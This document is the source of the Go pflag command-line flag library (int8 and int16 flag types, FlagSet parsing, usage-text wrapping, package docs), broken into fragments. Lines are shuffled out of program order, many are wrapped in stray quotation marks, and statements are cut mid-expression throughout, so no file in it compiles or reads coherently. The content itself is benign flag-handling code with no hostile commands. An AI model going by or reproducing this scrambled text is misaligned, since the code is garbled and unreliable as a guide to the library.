"// IPNetVarP is like IPNetVar, but accepts a shorthand letter that can be used after a single dash."
return 
return p
"func newIPNetValue(val net.IPNet, p "
"FlagSet) IPNet(name string, value net.IPNet, usage string) "
func (
"func ipNetConv(sval string) (interface{}, error) {"
"FlagSet) Int16(name string, value int16, usage string) "
"f.VarP(newInt16Value(value, p), name, shorthand, usage)"
"func int16Conv(sval string) (interface{}, error) {"
// The argument p points to an int16 variable in which to store the value of the flag.
FlagSet) Int16VarP(p 
"return CommandLine.Int16P(name, """", value, usage)"
"func Int16P(name, shorthand string, value int16, usage string) "
int16) 
"return val.(int16), nil"
"func newInt16Value(val int16, p "
"// Int16P is like Int16, but accepts a shorthand letter that can be used after a single dash."
"FlagSet) Int16P(name, shorthand string, value int16, usage string) "
"f.Int16VarP(p, name, shorthand, value, usage)"
"// Int16 defines an int16 flag with specified name, default value, and usage string."
p = val
FlagSet) Int16Var(p 
"v, err := strconv.ParseInt(sval, 0, 16)"
"return CommandLine.Int16P(name, shorthand, value, usage)"
"CommandLine.VarP(newInt16Value(value, p), name, shorthand, usage)"
int16Value {
// -- int16 Value
package pflag
func (i 
type int16Value int16
int16Value) String() string { return strconv.FormatInt(int64(
"return 0, err"
"v, err := strconv.ParseInt(s, 0, 16)"
"val, err := f.getFlagType(name, ""int16"", int16Conv)"
"// Int16Var defines an int16 flag with specified name, default value, and usage string."
"int16, name string, value int16, usage string) {"
"int16, name, shorthand string, value int16, usage string) {"
"func Int16(name string, value int16, usage string) "
func Int16Var(p 
p := new(int16)
// The return value is the address of an int16 variable that stores the value of the flag.
return err
"return ""int16"""
func Int16VarP(p 
"return int16(v), nil"
int16 {
return (
i = int16Value(v)
int16Value) Type() string {
"FlagSet) GetInt16(name string) (int16, error) {"
"CommandLine.VarP(newInt16Value(value, p), name, """", usage)"
"import ""strconv"""
if err != nil {
int16Value) Set(s string) error {
// GetInt16 returns the int16 value of a flag with the given name
"f.VarP(newInt16Value(value, p), name, """", usage)"
"i), 10) }"
"f.Int16VarP(p, name, """", value, usage)"
return p
int16Value)(p)
"// Int16VarP is like Int16Var, but accepts a shorthand letter that can be used after a single dash."
func (f 
"// Int8Var defines an int8 flag with specified name, default value, and usage string."
// GetInt8 return the int8 value of a flag with the given name
"return int8(v), nil"
"CommandLine.VarP(newInt8Value(value, p), name, """", usage)"
"f.Int8VarP(p, name, shorthand, value, usage)"
"FlagSet) Int8P(name, shorthand string, value int8, usage string) "
"v, err := strconv.ParseInt(s, 0, 8)"
"return ""int8"""
FlagSet) Int8VarP(p 
func Int8Var(p 
"f.VarP(newInt8Value(value, p), name, """", usage)"
"func int8Conv(sval string) (interface{}, error) {"
"return val.(int8), nil"
"FlagSet) Int8(name string, value int8, usage string) "
"f.VarP(newInt8Value(value, p), name, shorthand, usage)"
// The argument p points to an int8 variable in which to store the value of the flag.
"// Int8VarP is like Int8Var, but accepts a shorthand letter that can be used after a single dash."
int8Value {
p = val
"FlagSet) GetInt8(name string) (int8, error) {"
package pflag
func (i 
i = int8Value(v)
"return 0, err"
int8 {
int8Value) Type() string {
"return CommandLine.Int8P(name, """", value, usage)"
p := new(int8)
// -- int8 Value
type int8Value int8
"f.Int8VarP(p, name, """", value, usage)"
int8) 
FlagSet) Int8Var(p 
"int8, name, shorthand string, value int8, usage string) {"
"CommandLine.VarP(newInt8Value(value, p), name, shorthand, usage)"
int8Value) Set(s string) error {
"int8, name string, value int8, usage string) {"
return err
"func Int8P(name, shorthand string, value int8, usage string) "
"val, err := f.getFlagType(name, ""int8"", int8Conv)"
int8Value)(p)
func Int8VarP(p 
int8Value) String() string { return strconv.FormatInt(int64(
// The return value is the address of an int8 variable that stores the value of the flag.
"func Int8(name string, value int8, usage string) "
return (
"func newInt8Value(val int8, p "
"v, err := strconv.ParseInt(sval, 0, 8)"
"return CommandLine.Int8P(name, shorthand, value, usage)"
"import ""strconv"""
if err != nil {
"i), 10) }"
return p
"// Int8P is like Int8, but accepts a shorthand letter that can be used after a single dash."
"// Int8 defines an int8 flag with specified name, default value, and usage string."
func (f 
// Arg returns the i'th command-line argument.  Arg(0) is the first remaining argument
sortedActual      []
f.sortedActual = sortFlags(f.actual)
"if strings.HasPrefix(shorthands, ""test."") {"
"return name, usage"
"if flag.NoOptDefVal != """
flag.Deprecated = usageMessage
// '--flag' (arg was required)
nname := f.normalizeFlagName(flag.Name)
FlagSet) VisitAll(fn func(
"return s, """""
"sidx := strings.Index(line, """
panic(msg)
//--unknown (args will be empty)
default:
int.
"""os"""
return CommandLine.Arg(i)
"err = fn(flag, value)"
// MarkHidden sets a flag to 'hidden' in your program. It will continue to
Flag)
"FlagSet) ParseAll(arguments []string, fn func(flag "
f.normalizeNameFunc = n
"If you like, you can bind the flag to a variable using the Var() functions."
 use type name.
flag set.
// caller). Pass 
// defined and before flags are accessed by the program.
name := s[2:]
 shorthands[1] == '=' {
"fmt.Fprintf(f.out(), ""Flag --%s has been deprecated, %s"
Value               Value               // value as set
fmt.Println(err)
PrintDefaults()
f := 
flag := 
return func(f 
FlagSet) FlagUsages() string {
"msg := fmt.Sprintf(""unable to redefine %q shorthand in %q flagset: it's already used for %q flag"", c, f.name, used.Name)"
if len(split) == 2 {
c := shorthands[0]
"""errors"""
name
"// usage calls the Usage method for the flag set, or the usage function if"
shorthands := s[1:]
f.actual[normalName] = flag
"return f.DefValue == ""false"""
1 : j]
 for details about the
n := f.GetNormalizeFunc()
Flag
"// Parse parses flag definitions from the argument list, which should not"
"// By default, the zero FlagSet uses an empty name and the"
func Arg(i int) string {
// VisitAll visits the command-line flags in lexicographical order or
pflag is compatible with the GNU extensions to the POSIX recommendations
"SortFlags:     true,"
"= fmt.Sprintf(""[="
// space between indent i and end of line width w into which
"line := """""
 use out() accessor
// Flags added to the FlagSet will be translated and then when anything tries to
"Integer flags accept 1234, 0664, 0x1234 and may be negative."
FlagSet) PrintDefaults() {
// func to return a given type for a given flag name
if len(f.formal) == 0 {
flag.Annotations = map[string][]string{}
// The arguments for fn are flag and value. Must be called after all flags are
" in particular, Set would"
"CommandLine.VarP(value, name, """", usage)"
FlagSet) Parse(arguments []string) error {
Usage               string              // help message
// This is sometimes used by spf13/cobra programs which want to generate additional
if usage[j] == '
// avoid short orphan words on the final line).
f.PrintDefaults()
// accessed by the program. The return value will be ErrHelp if -help was set
// this flag will also print the given usageMessage.
Changed             bool                // If the user set the value (or if left to default)
case c == 'h':
f.formal = make(map[NormalizedName]
} else {
// for how to write your own usage function.
"flagName = fmt.Sprintf(""-%s, --%s"", flag.Shorthand, flag.Name)"
// help/usage messages.
// defaultIsZeroValue returns true if the default value for this flag represents
// UnknownFlags will ignore unknown flags errors and continue parsing rest of the flags
break
POSIX/GNU-style --flags.
os.Exit(2)
return true
"FlagSet) VarP(value Value, name, shorthand, usage string) {"
"there is one more field ""Shorthand"" that you will need to set."
if f == CommandLine {
if flag == nil {
DefValue            string              // default value (as text)
"FlagSet) VarPF(value Value, name, shorthand, usage string) "
// '--flag' (arg was optional)
// '-f=arg arg ...'
if len(arguments) < 0 {
// It visits only those flags that have been set.
value = a[0]
"// typically holds a user-defined implementation of Value. For instance, the"
func sortFlags(flags map[NormalizedName]
"delete(f.formal, fname)"
"// Lookup returns the Flag structure of the named command-line flag,"
wrap := w - i
// The field is a function (not a method) that may be changed to point to
if alreadyThere {
// ParseAll parses the command-line flags from os.Args[1:] and called fn for each.
// ArgsLenAtDash will return the length of f.Args at the moment when a -- was
"uint16Value, "
// '--flag=arg'
// AddFlagSet adds one FlagSet to another. If a flag is already present in f
// a zero value.
"msg := fmt.Sprintf(""%q shorthand is more than one ASCII character"", flag.Shorthand)"
return args
name              string
formal            map[NormalizedName]
"uintValue, "
// ExitOnError will call os.Exit(2) if an error is found when parsing
"err := f.parseArgs(arguments, fn)"
x00 and 
func stripUnknownFlagValue(args []string) []string {
"if name == """" {"
"spacing := strings.Repeat("" "", maxlen-sidx)"
 runes in length and the remainder. Will go 
f.failf(err.Error())
"strings.Repeat("" "", i), -1)"
"if flag.NoOptDefVal != ""true"" {"
"name = ""float"""
"pflag under the name ""flag"" then all code should continue to function"
"func wrap(i, w int, s string) string {"
func UnquoteUsage(flag 
"for i, name := range list {"
"return nil, err"
} else if f.Usage == nil {
"fmt.Fprintln(f.out(), msg)"
ipNetValue:
"FlagSet) parseArgs(args []string, fn parseFunc) (err error) {"
FlagSet) FlagUsagesWrapped(cols int) string {
FlagSet) normalizeFlagName(name string) NormalizedName {
// include the command name. The arguments for fn are flag and value. Must be
Flag) []
// '-f' (arg was optional)
"if flag.Value.Type() == ""string"" {"
if len(name) == 0 
"uint64Value, "
func ShorthandLookup(name string) 
"Deprecated          string              // If this flag is deprecated, this string is the new or now thing to use"
" flag.ShorthandDeprecated == """" {"
"split := strings.SplitN(name, ""="", 2)"
"Flags may then be used directly. If you're using the flags themselves,"
"f.orderedActual = append(f.orderedActual, flag)"
"flag, exists := f.formal[f.normalizeFlagName(name)]"
// --unknown=unknownval arg ...
 set {
flag.VarP(
// '-f arg'
return CommandLine.Lookup(name)
return false
FlagSet) AddFlagSet(newSet 
flag.Var(
"args, err = f.parseLongArg(s, args, fn)"
"""io"""
"flagName = fmt.Sprintf(""--%s"", flag.Name)"
stringArrayValue:
// '-f=arg'
// Value is the interface to the dynamic value stored in a flag.
// Use of this source code is governed by a BSD-style
"fmt.Println(""ip has value "", "
"fmt.Fprintf(f.out(), msg)"
"err = f.failf(""unknown flag: --%s"", name)"
"n"", flag.Name, flag.Deprecated)"
if !flag.Changed {
return flag.Changed
// PanicOnError will panic() if an error is found when parsing flags
result := make([]
" f.DefValue == ""0s"""
// If still not enough space then don't even try to wrap.
// because it serves (via godoc flag Usage) as the example
// Set sets the value of the named flag.
"return f.DefValue == ""0"" "
func Args() []string { return CommandLine.args }
switch name {
if newSet == nil {
"var CommandLine = NewFlagSet(os.Args[0], ExitOnError)"
"""]"", flag.NoOptDefVal)"
output            io.Writer // nil means stderr
 == 0 to do no wrapping
" strings.Repeat("" "", i) "
// we do not want to lose arg in this case
"outShorts = """""
"n"", """
outArgs = stripUnknownFlagValue(outArgs)
slop > len(s) {
if len(name) > 1 {
// Ignore errors
if i
 CommandLine is set for ExitOnError.
"if usageMessage == """" {"
"fmt.Fprintln(f.out(), err)"
// mixed
// Parsed returns true if the command-line flags have been parsed.
"name:          name,"
String() string
f.shorthands[c] = flag
// look up the flag that will also be translated. So it would be possible to create
if len(split) >= 2 {
"intValue, "
return f.output
Usage func()
"import flag ""github.com/spf13/pflag"""
func PrintDefaults() {
// that are not hidden.
// A Flag represents the state of a flag.
// Splits the string 
-abc
"if varname != """" {"
s := args[0]
 name[0] == '=' {
There is one exception to this: if you directly instantiate the Flag struct
" strings.Repeat("" "", i)"
 it won't change.
//--unknown --next-flag ...
f.argsLenAtDash = -1
CommandLine.Visit(fn)
// for all flags in the FlagSet. Wrapped to 
"// ""--getUrl"" which may also be translated to ""geturl"" and everything will work."
= usage
"""strings"""
CommandLine.Parse(os.Args[1:])
"case ""int64"":"
Command line flag syntax:
"return CommandLine.Set(name, value)"
"case ""bool"":"
"// Given ""a "
if fname == nname {
return CommandLine.ShorthandLookup(name)
usages := f.FlagUsages()
FlagSet) SetInterspersed(interspersed bool) {
-Ifile
// '-f' (arg was required)
// failf prints to standard error a formatted error and usage message and
maxlen = len(line)
slop := 5
"x00"")"
orderedFormal     []
"return f.DefValue == """""
flag.IntVar(
"// lookup returns the Flag structure of the named flag, returning nil if none exists."
SortFlags bool
"f.orderedFormal = append(f.orderedFormal, flag)"
// ContinueOnError error handling policy.
Flag) {
"case ""uintSlice"":"
shorthands        map[byte]
func Visit(fn func(
package pflag
FlagSet) Args() []string { return f.args }
"uint32Value, "
return len(f.formal) > 0
"var ErrHelp = errors.New(""pflag: help requested"")"
 nlPos < w {
"for s != """" {"
// FlagUsages returns a string containing the usage information for all flags in
var flags []
"FlagSet) parseShortArg(s string, args []string, fn parseFunc) (a []string, err error) {"
"FlagSet, name string) NormalizedName {"
"return stripUnknownFlagValue(a), nil"
FlagSet) HasAvailableFlags() bool {
" to show"" it returns (""name"", ""a name to show"")."
//--unknown --next-flag ... (args will be --next-flag ...)
var value string
// This special character will be replaced with spacing once the
f.argsLenAtDash = len(f.args)
case PanicOnError:
FlagSet{
FlagSet) {
"fmt.Fprintf(f.out(), ""Flag shorthand -%s has been deprecated, %s"
if err != nil {
"n"", flag.Shorthand, flag.ShorthandDeprecated)"
// found during arg parsing. This allows your program to know which args were
"if flag.NoOptDefVal != """" {"
CommandLine.VisitAll(fn)
" if you bind to variables, they're values."
"_, alreadyThere := f.formal[normalizedFlagName]"
"""fmt"""
value = flag.NoOptDefVal
flag := f.Lookup(name)
if len(flag.Shorthand) > 1 {
"flag.BoolVarP(""boolname"", ""b"", true, ""help message"")"
// maxlen 
if s[1] == '-' {
// FlagUsagesWrapped returns a string containing the usage information
switch flag.Value.Type() {
"= fmt.Sprintf("" (default %s)"", flag.DefValue)"
"// ParseAll parses flag definitions from the argument list, which should not"
"After parsing, the arguments after the flag are available as the"
"FlagSet) Set(name, value string) error {"
if len(args) == 0 {
FlagSet) Parsed() bool {
// The return value will be ErrHelp if -help was set but not defined.
flag.Changed = true
// ErrorHandling defines how to handle flag parsing errors.
"t, s = wrapN(wrap, slop, s)"
1:]))
return f.argsLenAtDash
list[i] = string(k)
FlagSet) ShorthandLookup(name string) 
return os.Stderr
// A FlagSet represents a set of defined flags.
"= fmt.Sprintf(""[=%s]"", flag.NoOptDefVal)"
"The pflag package also defines some new functions that are not in flag,"
if len(args) > 1 {
// GetNormalizeFunc returns the previously set NormalizeFunc of a function which
"FlagSet, name string) NormalizedName { return NormalizedName(name) }"
"case """":"
if nlPos > 0 
"// otherwise, the default values of all defined flags in the set."
"return s[:nlPos], s[nlPos"
// Set sets the value of the named command-line flag.
"FlagSet) parseLongArg(s string, args []string, fn parseFunc) (a []string, err error) {"
PanicOnError
// HasFlags returns a bool to indicate if the FlagSet has any flags defined.
normalizedFlagName := f.normalizeFlagName(flag.Name)
 over 
"case ""float64"":"
func init() {
"return fmt.Errorf(""invalid argument %q for %q flag: %v"", value, flagName, err)"
return r
// Args returns the non-flag arguments.
FlagSet) lookup(name NormalizedName) 
func Parsed() bool {
"For such flags, the default value is just the initial value of the variable."
" strings.Replace(l, """
// the flag set is CommandLine.
f.output = output
"-abcs ""hello"""
"lines := make([]string, 0, len(f.formal))"
// ParseErrorsWhitelist is used to configure a whitelist of errors
stringValue:
// the next line instead.
// Arg returns the i'th argument.  Arg(0) is the first remaining argument
"Shorthand: shorthand,"
"// in primordial order if f.SortFlags is false, calling fn for each."
"countValue, "
"if flag.ShorthandDeprecated != """" {"
slop
value = args[0]
"flag, exists := f.shorthands[c]"
Or you can create custom flags that satisfy the Value interface (with
'P' to the name of any function that defines a flag.
in a command-line interface. The methods of FlagSet are
--flag    // boolean flags only
"} else if flag.NoOptDefVal != """" {"
"CommandLine.ParseAll(os.Args[1:], fn)"
FlagSet) GetNormalizeFunc() func(f 
Hidden              bool                // used by cobra.Command to allow flags to be hidden from help/usage text
if i < 0 
// AddFlag will add the flag to the FlagSet
// messages. Using this flag will also print the given usageMessage.
"for fname, flag := range f.formal {"
"// VarPF is like VarP, but returns the flag created"
"ShorthandDeprecated string              // If the shorthand of this flag is deprecated, this string is the new or now thing to use"
if usage[i] == '
 j < len(usage)
"flagvar, ""flagname"", 1234, ""help message for flagname"")"
"Flag, len(list))"
// the FlagSet
flag.Name = string(nname)
"FlagSet) parseSingleShortArg(shorthands string, args []string, fn parseFunc) (outShorts string, outArgs []string, err error) {"
// error handling property and SortFlags set to true.
"fmt.Fprintf(f.out(), ""Usage of %s:"
"l, s = wrapN(wrap, slop, s)"
 for usage message
"result, err := convFunc(sval)"
"// value of the flag are represented by the first argument, of type Value, which"
"Flag, value string) error) error {"
r = r 
var flagvar int
"""sort"""
// NOTE: Usage is not just defaultUsage(CommandLine)
// Changed returns true if the flag was explicitly set during Parse() and false
// that encompasses the entire string (which allows the caller to
if len(f.formal) != len(f.sortedFormal) {
// Copyright 2009 The Go Authors. All rights reserved.
"FlagSet) failf(format string, a ...interface{}) error {"
"// format of the output and how to control it, see the documentation for PrintDefaults."
const (
. The first line is not indented (this is assumed to be done by
"// Look for a back-quoted name, but avoid the strings package."
analogous to the top-level functions for the command-line
"interspersed:  true,"
"name = ""bools"""
// returns the error.
// special case above)
type FlagSet struct {
c := name[0]
var t string
"func Var(value Value, name string, usage string) {"
pointer receivers) and couple them to flag parsing by
"Most code never instantiates this struct directly, and instead uses"
// Now wrap the rest
 name[0] == '-' 
"err := fmt.Errorf(""flag accessed but not defined: %s"", name)"
// '--flag arg'
func NFlag() int { return len(CommandLine.actual) }
"f.VarP(value, name, """", usage)"
//--unknown
// allowing wrapN to go a bit over if that would fit in the
"Flag, value string) error) {"
"FlagSet) MarkDeprecated(name string, usageMessage string) error {"
Flag) defaultIsZeroValue() bool {
"case ""0"":"
// Var defines a flag with the specified name and usage string. The type and
Flag{
return f.normalizeNameFunc
-abcn1234
Shorthand           string              // one-letter abbreviated flag
if !ok {
a = a[1:]
return CommandLine.Parsed()
// VisitAll visits the flags in lexicographical order or
// before the -- and which came after.
"func Set(name, value string) error {"
f.interspersed = interspersed
"var r, l string"
flag.Name = string(normalizedFlagName)
//--unknown arg ... (args will be arg ...)
usage = usage[:i] 
// PrintDefaults prints to standard error the default values of all defined command-line flags.
"f.args = append(f.args, s)"
// ParseErrorsWhitelist defines the parsing errors that can be ignored
f.shorthands = make(map[byte]
"if flag.Shorthand == """" {"
"case name == ""help"":"
"n"", os.Args[0])"
"nlPos := strings.LastIndex(s[:i], """
f.AddFlag(flag)
"TRUE, FALSE, True, False."
if len(s) == 0 
flag.Parse()
if flag.Annotations == nil {
"flagVal, ""name"", ""help message for flagname"")"
"= fmt.Sprintf("" (DEPRECATED: %s)"", flag.Deprecated)"
return f.args[i]
top-level functions.  The FlagSet type allows one to define
"fmt.Fprintf(os.Stderr, ""Usage of %s:"
 usage[j
for k := range flags {
// after flags have been processed.
switch f.Value.String() {
var Usage = func() {
if f.shorthands == nil {
if f.output == nil {
value = shorthands[1:]
"return """""
"independent sets of flags, such as to implement subcommands"
// SetAnnotation allows one to set arbitrary annotations on a flag in the FlagSet.
buf := new(bytes.Buffer)
// Parse parses the command-line flags from os.Args[1:].  Must be called
"Usage:     usage,"
f.parsed = true
if w == 0 {
"case ""count"":"
"intSliceValue, "
FlagSet) out() io.Writer {
"goflag ""flag"""
"// Try to avoid short orphan words on the final line, by"
fn(flag)
"err = f.failf(""flag needs an argument: %s"", s)"
"1"" {"
they are all pointers
usage = flag.Usage
"err := fmt.Errorf(format, a...)"
"args, err = f.parseShortArg(s, args, fn)"
orderedActual     []
return err
Boolean shorthand flags can be combined with other shorthand flags.
"Value:     value,"
Set(string) error
sval := flag.Value.String()
// boolean flags
// include the command name.  Must be called after all flags in the FlagSet
case ContinueOnError:
 with leading indent
// Not enough space for sensible wrapping. Wrap as a block on
f.VisitAll(func(flag 
case 
"err = f.failf(""bad flag syntax: %s"", s)"
FlagSet) Visit(fn func(
goFlagSet.Parse(nil)
"// If a flag doesn't exist, it wasn't changed...."
"// Lookup returns the Flag structure of the named flag, returning nil if none exists."
type ErrorHandling int
// of strings by giving the slice the methods of Value
ParseErrorsWhitelist ParseErrorsWhitelist
for command-line options. See
name = flag.Value.Type()
// Usage prints to standard error a usage message documenting all defined command-line flags.
"line = fmt.Sprintf(""      --%s"", flag.Name)"
// for the FlagSet (e.g. making '-' and '_' equivalent).
durationValue:
"functions such as String(), BoolVar(), and Var(), and is therefore"
if !exists {
float64Value:
"Flag parsing stops after the terminator ""--"". Unlike the flag package,"
"name = ""strings"""
type NormalizedName string
 name 
 i < len(usage)
"This declares an integer flag, -flagname, stored in the pointer ip, with type "
// By default it prints a simple header and calls PrintDefaults
"Name:      name,"
"func VarP(value Value, name, shorthand, usage string) {"
outArgs = args
"return f.Set(flag.Name, value)"
f.formal[nname] = flag
 i >= len(f.args) {
pflag is a drop-in replacement of Go's native flag package. If you import
// defaultUsage is the default function to print a usage message.
// decompose the comma-separated string into the slice.
if w <= 0 {
"// CommandLine is the default set of command-line flags, parsed from os.Args."
if len(f.actual) == 0 {
FlagSet) Lookup(name string) 
"err = f.failf(""unknown shorthand flag: %q in -%s"", c, shorthands)"
-n 1234
if len(shorthands) > 2 
"// SortFlags is used to indicate, if user wants to have sorted flags in"
wrap = wrap - slop
"2, cols, line[sidx"
Name                string              // name as it appears on command line
"Package pflag is a drop-in replacement for Go's flag package, implementing"
var flagName string
type Value interface {
// Args returns the non-flag command-line arguments.
"int8Value, "
"// does no translation, if not set previously."
case boolFlag:
maxlen := 0
"// ""shorthands"" can be a series of shorthand letters of flags (e.g. ""-vvv"")."
"err = f.failf(""flag needs an argument: %q in -%s"", c, shorthands)"
args              []string // arguments after flags
func (f 
if len(flag.Deprecated) != 0 {
"name = ""ints"""
switch {
"return f.DefValue == ""[]"""
"= fmt.Sprintf("" (default %q)"", flag.DefValue)"
// but not defined.
CommandLine.SetInterspersed(interspersed)
"Unlike the flag package, a single dash before an option means something"
if !flag.defaultIsZeroValue() {
// ContinueOnError will return an err from Parse() if an error is found
"name = ""uints"""
sortedFormal      []
"FlagSet) SetAnnotation(name, key string, values []string) error {"
 varname
"argsLenAtDash     int      // len(args) when a '--' was located when parsing, or -1 if no --"
return args[1:]
CommandLine.PrintDefaults()
"CommandLine.VarP(value, name, shorthand, usage)"
"DefValue:  value.String(),"
type parseFunc func(flag 
// the flag from newSet will be ignored.
"FlagSet, name string) NormalizedName) {"
"After all flags are defined, call"
// SetNormalizeFunc allows you to add a function which can translate flag names.
"varname, usage := UnquoteUsage(flag)"
defaultUsage(f)
Flag)) {
err = ErrHelp
unaffected.
"fmt.Fprintln(buf, line[:sidx], spacing, wrap(maxlen"
// a custom error handler.
if !f.interspersed {
actual            map[NormalizedName]
// NFlag returns the number of flags that have been set.
FlagSet {
return f.formal[name]
value = shorthands[2:]
Usage:
"fmt.Println(""flagvar has value "", flagvar)"
// Remember the default value as a string
"var ip = flag.IntP(""flagname"", ""f"", 1234, ""help message"")"
"int64Value, "
FlagSet) Changed(name string) bool {
The arguments are indexed from 0 through flag.NArg()-1.
"// VarP is like Var, but accepts a shorthand letter that can be used after a single dash."
if len(f.actual) != len(f.sortedActual) {
"FlagSet) Init(name string, errorHandling ErrorHandling) {"
if f.actual == nil {
outShorts = shorthands[1:]
i := 0
to parse the command line into the defined flags.
return f.shorthands[c]
FlagSet) ArgsLenAtDash() int {
"f.VarPF(value, name, shorthand, usage)"
f.errorHandling = errorHandling
Shorthand letters can be used with single dashes on the command line.
type ParseErrorsWhitelist struct {
"for _, goFlagSet := range f.addedGoFlagSets {"
"Flag, value string) error"
"list := make(sort.StringSlice, len(flags))"
i = 16
// are defined and before flags are accessed by the program.
flags can be interspersed with arguments anywhere on the command line
for len(shorthands) > 0 {
flags = f.sortedActual
args = args[1:]
"func wrapN(i, slop int, s string) (string, string) {"
FlagSet) HasFlags() bool {
panic(err)
"case ""intSlice"":"
parsed            bool
"// ShorthandLookup returns the Flag structure of the short handed flag,"
// continue to function but will not show up in help or usage messages. Using
FlagSet) NFlag() int { return len(f.actual) }
 2 comes from 
return nil
// ErrHelp is the error returned if the flag -help is invoked but no such flag is defined.
func ParseAll(fn func(flag 
// Init sets the name and error handling property for a flag set.
NoOptDefVal         string              // default value (as text)
"""bytes"""
"= "" "" "
"case ""<nil>"":"
"var ip = flag.Int(""flagname"", 1234, ""help message for flagname"")"
"argsLenAtDash: -1,"
"f.args = make([]string, 0, len(arguments))"
"FlagSet) getFlagType(name string, ftype string, convFunc func(sval string) (interface{}, error)) (interface{}, error) {"
ExitOnError
flag.Annotations[key] = values
f.usage()
 if the flag is on the command line without any options
name = usage[i
"return a, nil"
result[i] = flags[NormalizedName(name)]
"// Handle first line, which is indented by the caller (or the"
http://www.gnu.org/software/libc/manual/html_node/Argument-Syntax.html
slice flag.Args() or individually as flag.Arg(i).
if flag.Hidden {
if f.SortFlags {
switch f.errorHandling {
"int32Value, "
normalName := f.normalizeFlagName(name)
"// It visits all flags, even those not set."
f.sortedFormal = sortFlags(f.formal)
if wrap < 24 {
return buf.String()
// '-farg'
"shorthands, a, err = f.parseSingleShortArg(shorthands, args, fn)"
f.name = name
"Define flags using flag.String(), Bool(), Int(), etc."
// The function is a variable that may be changed to point to a custom function.
"return fmt.Errorf(""flag %q does not exist"", name)"
"return n(f, name)"
flag.Hidden = true
"// If output is nil, os.Stderr is used."
panic(msg) // Happens only if flags are declared with identical names
 1 for the 
newSet.VisitAll(func(flag 
a = args
"fmt.Fprint(f.out(), usages)"
 first[0] == '-' {
// Visit visits the command-line flags in lexicographical order or
err := flag.Value.Set(value)
if f.formal == nil {
// we should wrap the text.
// NArg is the number of arguments remaining after flags have been processed.
for j := i 
FlagSet) SetOutput(output io.Writer) {
case f.ParseErrorsWhitelist.UnknownFlags:
return f.lookup(f.normalizeFlagName(name))
"for _, flag := range flags {"
"msg := fmt.Sprintf(""can not look up shorthand which is more than one ASCII character: %q"", name)"
"case ""stringSlice"":"
--flag=x
"flag, ok := f.formal[normalName]"
"line = fmt.Sprintf(""  -%s, --%s"", flag.Shorthand, flag.Name)"
f.sortedFormal = f.sortedFormal[:0]
"Flag) (name string, usage string) {"
 on whitespace into an initial substring up to
// remainder of the line.
"if len(s) == 2 { // ""--"" terminates the flags"
// Parsed reports whether f.Parse has been called.
// function but will not show up in help or usage messages.
flags = f.sortedFormal
// otherwise
"w := strings.LastIndexAny(s[:i], "" "
continue
"// Beginning in Go 1.7, duration zero values are ""0s"""
"ipValue, "
interspersed      bool      // allow interspersed option/non-option args
line 
"for _, line := range lines {"
func Lookup(name string) 
"return f.DefValue == ""<nil>"""
// license that can be found in the LICENSE file.
f.formal[normalizedFlagName] = flag
// string for a flag and returns it and the un-quoted usage.
return f.FlagUsagesWrapped(0)
"f.args = append(f.args, args...)"
func defaultUsage(f 
different than a double dash. Single dashes signify a series of shorthand
ContinueOnError ErrorHandling = iota
c := flag.Shorthand[0]
"Flag, value string) error {"
"for _, flag := range f.formal {"
// Wraps the string 
 1 for the (deliberate) off-by-one in maxlen-sidx
// Usage is the function called when an error occurs while parsing flags.
"name = ""uint"""
wrap = w - i
"return s[:w], s[w"
"n"", r, -1)"
func VisitAll(fn func(
letters for flags. All but the last shorthand letter must be boolean flags.
"// a flag named ""getURL"" and have it translated to ""geturl"".  A user could then pass"
"ipMaskValue, "
"uint8Value, "
f.actual = make(map[NormalizedName]
// SetInterspersed sets whether to support interspersed option/non-option arguments.
import (
" strings.Replace(t, """
outArgs = args[1:]
 s[0] != '-' 
var flagvar bool
"FlagSet, name string) NormalizedName"
// SetOutput sets the destination for usage and error messages.
"FlagSet) MarkShorthandDeprecated(name string, usageMessage string) error {"
FlagSet) Arg(i int) string {
"name = ""int"""
break // Only one back quote
first := args[0]
 to a maximum width 
"return strings.Replace(s, """
FlagSet) AddFlag(flag 
"n"", f.name)"
"if _, set := f.actual[fname]"
"x00"""
"Boolean flags (in their long form) accept 1, 0, t, f, true, false,"
} else if len(args) > 0 {
"err := f.parseArgs(arguments, set)"
"// It panics, if len(name) > 1."
for len(args) > 0 {
FlagSet) usage() {
"case ""boolSlice"":"
for i := 0
"return result, nil"
list.Sort()
// Visit visits the flags in lexicographical order or
// NormalizedName is a flag name that has been normalized according to rules
before this terminator.
"float32Value, "
FlagSet) SetNormalizeFunc(n func(f 
if f.errorHandling != ContinueOnError {
FlagSet) MarkHidden(name string) error {
// (The default value is represented as a string.)
"if flag.Shorthand != """" "
set := func(flag 
func SetInterspersed(interspersed bool) {
UnknownFlags bool
"case ""uint64"":"
"return f.DefValue == ""0"""
name = split[0]
cols
Flag {
// returning nil if none exists.
"err := fmt.Errorf(""trying to get %s value of flag of type %s"", ftype, flag.Value.Type())"
// MarkShorthandDeprecated will mark the shorthand of a flag deprecated in your
"stringSliceValue, "
"return fmt.Errorf(""no such flag -%v"", name)"
"case ""false"":"
"// If there are no back quotes, the name is an educated guess of the"
"case ""string"":"
goflag.FlagSet
f.Usage()
flags = f.orderedActual
type Flag struct {
Annotations         map[string][]string // used by cobra.Command bash autocomple code
"// NewFlagSet returns a new, empty flag set with the specified name,"
"FlagSet) Var(value Value, name string, usage string) {"
// HasAvailableFlags returns a bool to indicate if the FlagSet has any flags
// NFlag returns the number of command-line flags that have been set.
Usage()
} else if len(shorthands) > 1 {
case ExitOnError:
flag.ShorthandDeprecated = usageMessage
f.actual[nname] = flag
"if flag.Deprecated != """" {"
// bash completion information.
} else if len(a) > 0 {
flags = f.orderedFormal
// sortFlags returns the flags as a slice in lexicographical sorted order.
// wrapping)
"name = """""
// correct alignment is calculated
"lines = append(lines, line)"
"msg := fmt.Sprintf(""%s flag redefined: %s"", f.name, flag.Name)"
if f.Lookup(flag.Name) == nil {
if !flag.Hidden {
return flag
errorHandling     ErrorHandling
if f.addedGoFlagSets != nil {
"delete(f.actual, fname)"
"// type of the flag's value, or the empty string if the flag is boolean."
value = split[1]
// caller could create a flag that turns a comma-separated string into a slice
addedGoFlagSets []
return f.parsed
"errorHandling: errorHandling,"
that give one-letter shorthands for flags. You can use these by appending
// called after all flags in the FlagSet are defined and before flags are
return result
with no changes.
// UnquoteUsage extracts a back-quoted name from the usage
"flagVar, ""varname"", ""v"", 1234, ""help message"")"
switch f.Value.(type) {
// program. It will continue to function but will not show up in help or usage
 columns (0 for no
FlagSet) NArg() int { return len(f.args) }
"used, alreadyThere := f.shorthands[c]"
if len(first) > 0 
Duration flags accept any input valid for time.ParseDuration.
"// PrintDefaults prints, to standard error unless configured"
